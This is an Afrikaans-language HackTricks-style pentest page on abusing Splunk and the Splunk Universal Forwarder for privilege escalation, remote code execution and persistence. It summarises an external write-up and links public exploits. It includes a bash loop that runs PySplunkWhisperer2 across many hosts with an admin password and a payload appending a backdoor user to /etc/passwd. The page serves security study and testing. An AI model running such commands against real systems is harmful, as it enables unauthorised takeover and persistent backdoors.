# Splunk LPE en Volharding

{{#include ../../banners/hacktricks-training.md}}

As **jy 'n masjien **intern** of **extern** opneem en **Splunk draai** (poort 8090), as jy gelukkig enige **geldige akrediteer** ken, kan jy die **Splunk-diens misbruik** om 'n **shell** as die gebruiker wat Splunk draai, uit te voer. As root dit draai, kan jy voorregte na root opgradeer.

As jy ook **reeds root is en die Splunk-diens nie net op localhost luister nie**, kan jy die **wagwoord** lêer **van** die Splunk-diens **steel** en die wagwoorde **krak**, of **nuwe** akrediteer daaraan **byvoeg**. En volharding op die gasheer handhaaf.

In die eerste beeld hieronder kan jy sien hoe 'n Splunkd webblad lyk.

## Splunk Universele Voorouer Agent Exploit Opsomming

Vir verdere besonderhede, kyk na die pos [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dit is net 'n opsomming:

**Exploit Oorsig:**
'n Exploit wat die Splunk Universele Voorouer Agent (UF) teiken, laat aanvallers met die agent wagwoord toe om arbitrêre kode op stelsels wat die agent draai, uit te voer, wat moontlik 'n hele netwerk in gevaar stel.

**Belangrike Punten:**

- Die UF-agent valideer nie inkomende verbindings of die egtheid van kode nie, wat dit kwesbaar maak vir ongeoorloofde kode-uitvoering.
- Algemene wagwoord verkrygingsmetodes sluit in om hulle in netwerk gidse, lêer deel, of interne dokumentasie te vind.
- Suksevolle uitbuiting kan lei tot SYSTEM of root vlak toegang op gecompromitteerde gashere, data eksfiltrasie, en verdere netwerk infiltrasie.

**Exploit Uitvoering:**

1. Aanvaller verkry die UF-agent wagwoord.
2. Gebruik die Splunk API om opdragte of skripte na die agente te stuur.
3. Moglike aksies sluit lêer ekstraksie, gebruiker rekening manipulasie, en stelsel kompromie in.

**Impak:**

- Volledige netwerk kompromie met SYSTEM/root vlak toestemmings op elke gasheer.
- Potensiaal om logging te deaktiveer om opsporing te ontduik.
- Installering van agterdeure of ransomware.

**Voorbeeld Opdrag vir Uitbuiting:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Gebruikbare openbare exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Misbruik van Splunk-vrae

**Vir verdere besonderhede, kyk na die pos [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{{#include ../../banners/hacktricks-training.md}}
